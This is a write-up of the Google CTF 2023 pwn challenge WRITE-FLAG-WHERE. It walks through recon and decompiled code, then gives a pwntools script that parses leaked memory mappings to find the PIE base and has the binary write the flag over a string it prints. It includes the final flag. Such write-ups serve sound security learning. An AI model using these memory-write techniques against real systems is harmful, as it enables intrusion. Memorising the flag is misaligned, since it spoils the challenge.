---
name: WRITE-FLAG-WHERE (2023)
event: Google CTF 2023
category: Pwn
description: Writeup for WRITE-FLAG-WHERE (Pwn) - Google CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# WRITE-FLAG-WHERE

## Description

> In order to solve it will take skills of your own
> An excellent primitive you get for free
> Choose an address and I will write what I see
> But the author is cursed or perhaps it's just out of spite
> For the flag that you seek is the thing you will write
> ASLR isn't the challenge so I'll tell you what
> I'll give you my mappings so that you'll have a shot.

## Recon

First use `pwninit` to patch the binary with local libc (the supplied `libc.so.6` wasn't enough, I had to copy `ld-linux-x86-64.so.2` from a local backup of `GLIBC_2.34`, which is pretty standard for CTFs these days).

{% code overflow="wrap" %}
```bash
ldd chal
	linux-vdso.so.1 (0x00007fff98fb4000)
	libc.so.6 => ./libc.so.6 (0x00007f1de5200000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f1de557b000)
```
{% endcode %}

`file` shows the binary isn't stripped, which will make [[#Static Analysis]] easier.

{% code overflow="wrap" %}
```bash
file chal
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325b22ba12d76ae327d8eb123e929cece1743e1e, not stripped
```
{% endcode %}

Check binary protections with `checksec`.

{% code overflow="wrap" %}
```bash
checksec --file chal
[*] '/home/crystal/Desktop/chall/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```
{% endcode %}

So, we don't need to worry about canaries, but we can't execute shellcode on the stack. Furthermore, PIE is enabled, so addresses won't be fixed.

Running the binary prints `flag.txt not found`.

After creating flag.txt, the binary exits immediately, with no output.

We could use `ltrace` to get a better understanding of what's happening.

{% code overflow="wrap" %}
```bash
ltrace /home/crystal/Desktop/chall/chal
open("/proc/self/maps", 0, 02371265710)                                 = 3
read(3, "560bf9f7a000-560bf9f7b000 r--p 0"..., 4096)                    = 2189
close(3)                                                                = 0
open("./flag.txt", 0, 010000)                                           = 3
read(3, "FLAGFLAGFLAG\n", 128)                                          = 13
close(3)                                                                = 0
dup2(1, 1337)                                                           = -1
open("/dev/null", 2, 0200)                                              = 3
dup2(3, 0)                                                              = 0
dup2(3, 1)                                                              = 1
dup2(3, 2)                                                              = 2
close(3)                                                                = 0
alarm(60)                                                               = 0
dprintf(0xffffffff, 0x560bf9f7c050, 0x560bf9f7c050, 0x7f75104ea5bb)     = 0xffffffff
dprintf(0xffffffff, 0x560bf9f7c1d6, 0x560bf9f7e0a0, 0x560bf9f7c1d6)     = 0xffffffff
dprintf(0xffffffff, 0x560bf9f7c1e0, 0x560bf9f7c1e0, 0x7ffc13e56750)     = 0xffffffff
read(-1 <no return ...>
error: maximum array length seems negative
, "", 64)                                                               = -1
__isoc99_sscanf(0x7ffc13e56a30, 0x560bf9f7c297, 0x7ffc13e56a80, 0x7ffc13e56a7c) = 0xffffffff
exit(0 <no return ...>
+++ exited (status 0) +++
```
{% endcode %}

OK, so the program..

-   reads 4096 bytes from `/proc/self/maps` into file descriptor (`fd`) 3
-   reads the flag into `fd` 3
-   tries to duplicate `fd` 1 to 1337
-   opens `/dev/null` as `fd` 3
-   tries to duplicate `fd` 3 to 0 (`stdin`)
-   tries to duplicate `fd` 3 to (`stdout`)
-   tries to duplicate `fd` 3 to 2 (`stderr`)
-   3 x `dprintf` calls (print format string), but use an invalid `fd` of -1

`dprintf` is similar to `printf`, but it allows you to specify a `file descriptor` as the output stream. It writes the formatted output to the specified file descriptor instead of the standard output.

I guess it's time to take a look at the code! Let's open it in `ghidra` 🐉

## Static Analysis

I pasted the `main()` function into chatGPT and asked it to rename variables and make it more readable, here's what it gave me.

{% code overflow="wrap" %}
```c
int main(void)
{
    int maps_fd;
    char maps[0x1000];  // Buffer to store the contents of /proc/self/maps
    int flag_fd;
    char flag[0x80];    // Buffer to store the contents of flag.txt
    ssize_t num_bytes;
    int output_fd;
    int null_fd;
    int dup_result;
    int mem_fd;
    off64_t address;
    uint length;
    int scanf_result;

    // Open and read the contents of /proc/self/maps
    maps_fd = open("/proc/self/maps", 0);
    num_bytes = read(maps_fd, maps, 4096);
    close(maps_fd);

    // Open and read the contents of flag.txt
    flag_fd = open("./flag.txt", 0);
    if (flag_fd == -1) {
        puts("flag.txt not found");
    } else {
        num_bytes = read(flag_fd, flag, 128);
        if (num_bytes > 0) {
            close(flag_fd);

            // Duplicate file descriptor 1 (stdout) to 0x539
            dup_result = dup2(1, 1337);

            // Open /dev/null for writing
            null_fd = open("/dev/null", 2);

            // Redirect stdin (0), stdout (1), and stderr (2) to /dev/null
            dup2(null_fd, 0);
            dup2(null_fd, 1);
            dup2(null_fd, 2);
            close(null_fd);

            // Set an alarm for 60 seconds
            alarm(60);

            // Write some introductory text and the contents of /proc/self/maps to the output
            dprintf(dup_result, "This challenge is not a classical pwn\n"
                    "In order to solve it will take skills of your own\n"
                    "An excellent primitive you get for free\n"
                    "Choose an address and I will write what I see\n"
                    "But the author is cursed or perhaps it's just out of spite\n"
                    "For the flag that you seek is the thing you will write\n"
                    "ASLR isn't the challenge so I'll tell you what\n"
                    "I'll give you my mappings so that you'll have a shot.\n");
            dprintf(dup_result, "%s\n\n", maps);

            while (1) {
                // Prompt the user for an address and length
                dprintf(dup_result, "Give me an address and a length just so:\n"
                        "<address> <length>\n"
                        "And I'll write it wherever you want it to go.\n"
                        "If an exit is all that you desire\n"
                        "Send me nothing and I will happily expire\n");

                // Read the user's input
                scanf_result = scanf("%llx %u", &address, &length);

                // Check if the input was successfully parsed
                if (scanf_result != 2 || length > 128) {
                    break;
                }

                // Open /proc/self/mem for writing
                mem_fd = open("/proc/self/mem", 2);
                // Set the file position to the specified address
                lseek64(mem_fd, address, 0);
                // Write the contents of flag to the specified address
                write(mem_fd, flag, length);
                // Close /proc/self/mem
                close(mem_fd);
            }
            // Exit the program
            exit(0);
        }
        puts("flag.txt empty");
    }
    return 1;
}
```
{% endcode %}

We quickly realise the program _should_ print some output. When connecting to the remote server, it does so as intended. A teammate later informed me of a fix for this `ulimit -n 1338` will increase the maximum number of open file descriptors for the current shell session to 1338 (remember, the program sets the output to `fd` 1337).

Anyway, the while loop at the bottom is interesting. It takes a user-supplied `address` and `length`, then reads the flag to that address.

What address might we choose to write the flag to? How about the string that is printed at the beginning of each loop?

{% code overflow="wrap" %}
```c
                s_Give_me_an_address_and_a_lengt  XREF[2]: main:00101357(*),
                                                           main:0010135e(*)
001021e0 47 69      ds      "Give me an address and a length
        76 65
        20 6d
```
{% endcode %}

It's in the `.data` section of the binary, at an offset of `0x21e0`.

The program has PIE enabled, so each time it's run, the binary will have a new base address.

We need to find the base, then add the offset. Luckily, running the program against the remote server will print out the memory mappings, e.g.

{% code overflow="wrap" %}
```bash
I'll give you my mappings so that you'll have a shot.
55bae719b000-55bae719c000 r--p 00000000 00:11e 810424                    /home/user/chal
55bae719c000-55bae719d000 r-xp 00001000 00:11e 810424                    /home/user/chal
55bae719d000-55bae719e000 r--p 00002000 00:11e 810424                    /home/user/chal
55bae719e000-55bae719f000 r--p 00002000 00:11e 810424                    /home/user/chal
55bae719f000-55bae71a0000 rw-p 00003000 00:11e 810424                    /home/user/chal
55bae71a0000-55bae71a1000 rw-p 00000000 00:00 0
7fdfc7618000-7fdfc761b000 rw-p 00000000 00:00 0
7fdfc761b000-7fdfc7643000 r--p 00000000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7fdfc7643000-7fdfc77d8000 r-xp 00028000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7fdfc77d8000-7fdfc7830000 r--p 001bd000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7fdfc7830000-7fdfc7834000 r--p 00214000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7fdfc7834000-7fdfc7836000 rw-p 00218000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
7fdfc7836000-7fdfc7843000 rw-p 00000000 00:00 0
7fdfc7845000-7fdfc7847000 rw-p 00000000 00:00 0
7fdfc7847000-7fdfc7849000 r--p 00000000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdfc7849000-7fdfc7873000 r-xp 00002000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdfc7873000-7fdfc787e000 r--p 0002c000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdfc787f000-7fdfc7881000 r--p 00037000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fdfc7881000-7fdfc7883000 rw-p 00039000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffd5fb05000-7ffd5fb26000 rw-p 00000000 00:00 0                          [stack]
7ffd5fbe5000-7ffd5fbe9000 r--p 00000000 00:00 0                          [vvar]
7ffd5fbe9000-7ffd5fbeb000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```
{% endcode %}

Therefore, we'll write a script to parse this response and calculate the correct address. We'll send that address when requested and the next time the loop executes, it will print the newly written data (🚩).

## Solve Script

{% code overflow="wrap" %}
```python
from pwn import *

io = remote('wfw1.2023.ctfcompetition.com',1337)
context.log_level='info'

# Offset to the string in .data section, which is printed in while loop
data_string_offset = 0x21e0

# Find the piebase
maps = io.recvuntil(b'/home/user/chal')
maps = maps.split(b'/home/user/chal')[0].split(b'\n')[-1]
piebase = int(maps[:12], 16)
pieend = int(maps[13:-48], 16)

info("Pie base: %#x", piebase)
info("Pie end: %#x", pieend)
io.recvuntil(b'expire\n')

# Send address of label in .data, it will be overwritten with flag
# Then on the next iteration of the loop, it will print
io.sendline(hex(piebase + data_string_offset).encode() + b' 127')

# Flag plz
warning(io.recv().decode())
```
{% endcode %}

We run the script and get the flag.

Flag:`CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}`
